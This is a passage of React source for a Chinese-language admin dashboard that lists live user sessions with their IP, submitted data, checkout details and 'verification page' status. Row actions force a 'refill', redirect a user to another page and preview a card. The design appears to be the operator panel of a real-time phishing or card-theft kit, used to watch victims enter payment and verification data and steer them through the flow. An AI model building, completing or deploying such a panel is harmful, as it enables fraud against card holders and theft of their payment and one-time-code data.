                  onChange={(e) => setOnlyCurrent(e.target.checked)}
                  className="accent-[#58a6ff]"
                />
                仅当前活跃
              </label>
              <select
                value={sortBy}
                onChange={(e) => setSortBy(e.target.value as SortKey)}
                className="bg-[#0d1117] border border-[#30363d] rounded-xl px-3 py-2 text-[11px] outline-none"
              >
                <option value="recent_activity">按最近活跃</option>
                <option value="id_desc">按序号倒序</option>
              </select>
              <select
                value={pageSize}
                onChange={(e) => setPageSize(Number(e.target.value))}
                className="bg-[#0d1117] border border-[#30363d] rounded-xl px-3 py-2 text-[11px] outline-none"
              >
                <option value={30}>30</option>
                <option value={50}>50</option>
                <option value={100}>100</option>
                <option value={200}>200</option>
              </select>
              <div className="flex rounded-xl border border-[#30363d] bg-[#0d1117] p-1">
                <button
                  onClick={() => setDensity('compact')}
                  className={[
                    'rounded-lg px-3 py-1.5 text-[11px] transition-colors',
                    density === 'compact' ? 'bg-[#1f6feb]/20 text-[#9ecbff]' : 'text-[#8b949e] hover:bg-[#161b22]',
                  ].join(' ')}
                >
                  紧凑
                </button>
                <button
                  onClick={() => setDensity('comfortable')}
                  className={[
                    'rounded-lg px-3 py-1.5 text-[11px] transition-colors',
                    density === 'comfortable' ? 'bg-[#1f6feb]/20 text-[#9ecbff]' : 'text-[#8b949e] hover:bg-[#161b22]',
                  ].join(' ')}
                >
                  详细
                </button>
              </div>
              <div className="flex gap-2">
                <button
                  onClick={() => {
                    setExpandAll(true);
                    setCollapsedMain({});
                  }}
                  className="flex-1 bg-[#21262d] hover:bg-[#30363d] border border-[#30363d] px-2.5 py-2 rounded-xl text-[11px]"
                >
                  全部展开
                </button>
                <button
                  onClick={() => {
                    setExpandAll(false);
                    setCollapsedMain({});
                  }}
                  className="flex-1 bg-[#21262d] hover:bg-[#30363d] border border-[#30363d] px-2.5 py-2 rounded-xl text-[11px]"
                >
                  全部折叠
                </button>
              </div>
            </div>
          </div>

          <div className="flex flex-wrap gap-1.5">
            <FilterButton k="needs_action" label="需处理" count={filterCounts.needs_action} />
            <FilterButton k="in_progress" label="填写中" count={filterCounts.in_progress} />
            <FilterButton k="submitted" label="已提交" count={filterCounts.submitted} />
            <FilterButton k="offline" label="离线" count={filterCounts.offline} />
            <FilterButton k="refills" label="有重填" count={filterCounts.refills} />
            <FilterButton k="all" label="全部" count={filterCounts.all} />
          </div>

          <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-2 rounded-xl border border-[#30363d] bg-[#0d1117] px-3 py-2">
            <div className="text-[11px] text-[#8b949e]">
              当前显示 <span className="font-mono text-[#c9d1d9]">{totalRows === 0 ? 0 : pageStart + 1}</span> -{' '}
              <span className="font-mono text-[#c9d1d9]">{Math.min(pageStart + pageSize, totalRows)}</span> /{' '}
              <span className="font-mono text-[#c9d1d9]">{totalRows}</span>
            </div>
            <div className="flex items-center gap-1.5">
              <button onClick={() => setPage(1)} disabled={safePage <= 1} className="bg-[#1a222d] border border-[#304158] px-2 py-1 rounded text-[11px] disabled:opacity-40">
                首页
              </button>
              <button onClick={() => setPage((p) => Math.max(1, p - 1))} disabled={safePage <= 1} className="bg-[#1a222d] border border-[#304158] px-2 py-1 rounded text-[11px] disabled:opacity-40">
                上一页
              </button>
              <span className="text-[11px] text-[#8b949e]">
                第 <span className="font-mono text-[#c9d1d9]">{safePage}</span> / <span className="font-mono text-[#c9d1d9]">{totalPages}</span> 页
              </span>
              <button onClick={() => setPage((p) => Math.min(totalPages, p + 1))} disabled={safePage >= totalPages} className="bg-[#1a222d] border border-[#304158] px-2 py-1 rounded text-[11px] disabled:opacity-40">
                下一页
              </button>
              <button onClick={() => setPage(totalPages)} disabled={safePage >= totalPages} className="bg-[#1a222d] border border-[#304158] px-2 py-1 rounded text-[11px] disabled:opacity-40">
                末页
              </button>
            </div>
          </div>

          {(pendingRecords || pendingOnlineUsers) && (
            <div className="flex flex-wrap items-center justify-between gap-2 rounded-xl border border-[#58a6ff]/35 bg-[#58a6ff]/10 px-3 py-2">
              <div className="text-xs text-[#c9d1d9]">
                检测到新更新{pendingCount > 0 ? `（约 ${pendingCount} 条新增）` : ''}，已暂停自动刷新以避免页面跳动。
              </div>
              <button
                onClick={() => applyWithScrollLock(pendingRecords, pendingOnlineUsers)}
                className="bg-[#58a6ff]/25 hover:bg-[#58a6ff]/35 border border-[#58a6ff]/45 text-[#c9e4ff] px-2.5 py-1 rounded-lg text-xs"
              >
                立即刷新视图
              </button>
            </div>
          )}
        </div>
      </div>
      </div>

      <div
        ref={tableContainerRef}
        className="overflow-auto max-h-[70vh] border border-[#30363d] rounded-[26px] bg-[#0d1117] shadow-[0_18px_42px_rgba(0,0,0,0.24)]"
      >
        <table className="min-w-[2200px] w-full text-xs">
          <thead className="bg-[#161b22] sticky top-0 border-b border-[#30363d] z-10">
            <tr className="text-[#9eb0c8]">
              <th className="px-3 py-2 text-left w-32">序号</th>
              <th className="px-2 py-2 text-left w-40">时间 / IP</th>
              <th className="px-3 py-2 text-left min-w-[420px]">资料</th>
              <th className="px-3 py-2 text-left min-w-[330px]">结账</th>
              <th className="px-3 py-2 text-left min-w-[280px]">验证页</th>
              <th className="px-3 py-2 text-center w-52">状态</th>
              <th className="px-3 py-2 text-center w-40">活跃度</th>
              <th className="px-3 py-2 text-center w-[300px]">操作</th>
            </tr>
          </thead>

          <tbody className="divide-y divide-[#21262d]">
            {totalRows === 0 ? (
              <tr>
                <td colSpan={8} className="py-12 text-center text-[#8b949e] text-sm">
                  <div>{emptyStateText}</div>
                  {(q || filter !== 'all' || onlyMain || onlyOnline || onlyCurrent) && (
                    <div className="mt-2 text-[11px] text-[#6e7b89]">可以尝试清空搜索、切回“全部”或取消附加筛选。</div>
                  )}
                </td>
              </tr>
            ) : (
              <>
                {virtualEnabled && virtualTop > 0 && (
                  <tr aria-hidden="true">
                    <td colSpan={8} style={{ height: `${virtualTop}px`, padding: 0 }} />
                  </tr>
                )}
                {visibleRows.map((row, rowIndex) => (
                  <AdminRow
                    key={row.r.id}
                    row={row}
                    rowIndex={rowIndex}
                    pageStart={pageStart}
                    virtualStartOffset={virtualEnabled ? virtualStart : 0}
                    density={density}
                    expandAll={expandAll}
                    collapsedMain={collapsedMain}
                    showHistory={showHistory}
                    copyText={copyText}
                    openCardPreview={openCardPreview}
                    toggleCollapse={toggleCollapse}
                    toggleHistory={toggleHistory}
                    getHistoryRows={getHistoryRows}
                    handleRefill={handleRefill}
                    handleCheckoutRefill={handleCheckoutRefill}
                    routeUserTo={routeUserTo}
                    badgeForActivity={badgeForActivity}
                  />
                ))}
                {virtualEnabled && virtualBottom > 0 && (
                  <tr aria-hidden="true">
                    <td colSpan={8} style={{ height: `${virtualBottom}px`, padding: 0 }} />
                  </tr>
                )}
              </>
            )}
          </tbody>
        </table>
      </div>

      <div className="mt-3 text-xs text-[#8b949e] flex items-center justify-between">
        <span>
          当前行数：{totalRows} · 页码：<span className="font-mono">{safePage}</span>/<span className="font-mono">{totalPages}</span> · 当前筛选：
          <span className="font-mono">{filter}</span>
        </span>
        <span>多用户模式</span>
      </div>
      </div>

      {cardPreview && <CardPreviewModal data={cardPreview} onClose={() => setCardPreview(null)} />}
    </div>
  );
}
